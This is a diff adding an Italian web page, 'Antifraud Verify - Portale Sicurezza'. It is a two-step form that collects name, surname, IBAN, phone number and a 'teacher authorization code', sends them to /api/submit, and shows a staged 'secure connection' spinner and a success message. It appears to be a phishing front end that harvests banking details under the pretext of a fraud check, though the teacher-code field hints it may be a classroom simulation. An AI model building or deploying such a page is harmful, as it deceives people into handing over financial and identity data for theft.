@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Antifraud Verify - Portale Sicurezza</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .loader {
+            border-top-color: #2563eb;
+            -webkit-animation: spinner 1.5s linear infinite;
+            animation: spinner 1.5s linear infinite;
+        }
+        @keyframes spinner {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="bg-slate-50 min-h-screen flex items-center justify-center p-4">
+
+    <div class="max-w-lg w-full bg-white rounded-2xl shadow-xl overflow-hidden border border-slate-200">
+
+        <!-- Header -->
+        <div class="bg-slate-900 px-6 py-5 flex items-center justify-center space-x-3">
+            <svg class="w-8 h-8 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+            </svg>
+            <h1 class="text-white text-xl font-bold tracking-wide">ANTIFRAUD <span class="text-blue-500">VERIFY</span></h1>
+        </div>
+
+        <div class="p-8">
+
+            <!-- STEP 1: Nome, Cognome, IBAN -->
+            <div id="step1" class="block">
+                <h2 class="text-lg font-semibold text-slate-800 mb-2">Verifica Identità e Conto</h2>
+                <p class="text-sm text-slate-500 mb-6">Inserisci i tuoi dati anagrafici e il codice IBAN per procedere con il controllo antifrode.</p>
+
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-sm font-medium text-slate-700 mb-1">Nome</label>
+                        <input type="text" id="nome1"
+                            class="w-full px-4 py-2 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
+                            placeholder="Es. Mario">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-slate-700 mb-1">Cognome</label>
+                        <input type="text" id="cognome1"
+                            class="w-full px-4 py-2 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
+                            placeholder="Es. Rossi">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-slate-700 mb-1">Codice IBAN</label>
+                        <input type="text" id="iban"
+                            class="w-full px-4 py-2 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all uppercase"
+                            placeholder="IT00A1234567890123456789012">
+                    </div>
+
+                    <div id="error1" class="hidden bg-red-50 text-red-600 text-sm p-3 rounded-lg border border-red-100 flex items-center">
+                        <svg class="w-4 h-4 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                        </svg>
+                        <span>Compila tutti i campi correttamente per proseguire.</span>
+                    </div>
+
+                    <button onclick="goToStep2()"
+                        class="w-full mt-6 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-lg shadow-md transition-colors flex justify-center items-center">
+                        <span>Prosegui alla fase 2</span>
+                        <svg class="w-5 h-5 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- STEP 2: Telefono, Data, Codice Docente -->
+            <div id="step2" class="hidden">
+                <div class="flex items-center space-x-2 mb-4">
+                    <button onclick="goBack()" class="text-slate-400 hover:text-slate-600">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
+                        </svg>
+                    </button>
+                    <h2 class="text-lg font-semibold text-slate-800">Conferma Finale</h2>
+                </div>
+                <p class="text-sm text-slate-500 mb-6">Conferma i tuoi dati e inserisci il codice di sicurezza per autorizzare il salvataggio.</p>
+
+                <div class="space-y-4">
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-sm font-medium text-slate-700 mb-1">Nome</label>
+                            <input type="text" id="nome2"
+                                class="w-full px-3 py-2 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
+                                placeholder="Es. Mario">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium text-slate-700 mb-1">Cognome</label>
+                            <input type="text" id="cognome2"
+                                class="w-full px-3 py-2 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
+                                placeholder="Es. Rossi">
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-sm font-medium text-slate-700 mb-1">Numero di Telefono</label>
+                        <input type="tel" id="telefono"
+                            class="w-full px-4 py-2 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
+                            placeholder="+39 333 1234567">
+                    </div>
+
+                    <div>
+                        <label class="block text-sm font-medium text-slate-700 mb-1">Data Corrente</label>
+                        <input type="date" id="data"
+                            class="w-full px-4 py-2 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all">
+                    </div>
+
+                    <div>
+                        <label class="block text-sm font-medium text-slate-700 mb-1">
+                            Codice Docente (Autorizzazione)
+                        </label>
+                        <input type="text" id="codiceDocente"
+                            class="w-full px-4 py-2 border border-slate-300 rounded-lg focus:ring-2 focus:ring-slate-900 focus:border-slate-900 outline-none transition-all bg-slate-50 font-mono tracking-widest text-center"
+                            placeholder="XXX-YYY">
+                    </div>
+
+                    <div id="error2" class="hidden bg-red-50 text-red-600 text-sm p-3 rounded-lg border border-red-100 flex items-center">
+                        <svg class="w-4 h-4 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                        </svg>
+                        <span id="error2Text">Compila tutti i campi rimanenti.</span>
+                    </div>
+
+                    <button onclick="submitData()"
+                        class="w-full mt-6 bg-slate-900 hover:bg-black text-white font-semibold py-3 px-4 rounded-lg shadow-md transition-colors flex justify-center items-center">
+                        <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                        </svg>
+                        <span>Verifica e Invia Dati</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- STEP 3: Loading / Successo -->
+            <div id="stepStatus" class="hidden py-8 text-center">
+                <!-- Loading -->
+                <div id="loadingState" class="flex flex-col items-center justify-center">
+                    <div class="loader ease-linear rounded-full border-4 border-t-4 border-slate-200 h-16 w-16 mb-4"></div>
+                    <h2 class="text-xl font-semibold text-slate-800">Dati in corso di verifica...</h2>
+                    <p class="text-slate-500 mt-2 text-sm">Connessione sicura al server in corso, attendere.</p>
+                </div>
+                <!-- Successo -->
+                <div id="successState" class="hidden flex-col items-center justify-center">
+                    <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-4 mx-auto">
+                        <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
+                        </svg>
+                    </div>
+                    <h2 class="text-xl font-semibold text-slate-800">Verifica Completata</h2>
+                    <p class="text-slate-500 mt-2 text-sm">I dati sono stati salvati e registrati correttamente nel sistema antifrode.</p>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        let datiStep1 = {};
+
+        // Imposta data odierna
+        document.getElementById('data').valueAsDate = new Date();
+
+        function goToStep2() {
+            const nome = document.getElementById('nome1').value.trim();
+            const cognome = document.getElementById('cognome1').value.trim();
+            const iban = document.getElementById('iban').value.trim();
+
+            if (!nome || !cognome || !iban) {
+                document.getElementById('error1').classList.remove('hidden');
+                return;
+            }
+            document.getElementById('error1').classList.add('hidden');
+
+            datiStep1 = { iban };
+
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }
+
+        function goBack() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+        }
+
+        async function submitData() {
+            const nome = document.getElementById('nome2').value.trim();
+            const cognome = document.getElementById('cognome2').value.trim();
+            const telefono = document.getElementById('telefono').value.trim();
+            const dataRegistrazione = document.getElementById('data').value;
+            const codiceDocente = document.getElementById('codiceDocente').value.trim();
+            const error2 = document.getElementById('error2');
+            const error2Text = document.getElementById('error2Text');
+
+            if (!nome || !cognome || !telefono || !dataRegistrazione || !codiceDocente) {
+                error2Text.textContent = 'Compila tutti i campi rimanenti.';
+                error2.classList.remove('hidden');
+                return;
+            }
+            error2.classList.add('hidden');
+
+            // Mostra schermata caricamento
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('stepStatus').classList.remove('hidden');
+            document.getElementById('loadingState').classList.remove('hidden');
+            document.getElementById('successState').classList.add('hidden');
+
+            const payload = {
+                nome,
+                cognome,
+                iban: datiStep1.iban,
+                telefono,
+                dataRegistrazione,
+                codiceDocente,
+            };
+
+            try {
+                const res = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+                const json = await res.json();
+
+                // Attesa minima per effetto visivo (2s)
+                setTimeout(() => {
+                    document.getElementById('loadingState').classList.add('hidden');
+
+                    if (json.success) {
+                        document.getElementById('successState').classList.remove('hidden');
+                        document.getElementById('successState').classList.add('flex');
+                    } else {
+                        // Torna allo step 2 con errore
+                        document.getElementById('stepStatus').classList.add('hidden');
+                        document.getElementById('step2').classList.remove('hidden');
+                        error2Text.textContent = json.message || 'Errore di connessione. Riprova.';
+                        error2.classList.remove('hidden');
+                    }
+                }, 2000);
+
+            } catch (err) {
+                setTimeout(() => {
+                    document.getElementById('stepStatus').classList.add('hidden');
+                    document.getElementById('step2').classList.remove('hidden');
+                    error2Text.textContent = 'Errore di rete. Controlla la connessione e riprova.';
+                    error2.classList.remove('hidden');
+                }, 2000);
+            }
+        }
+    </script>
+</body>
+</html>
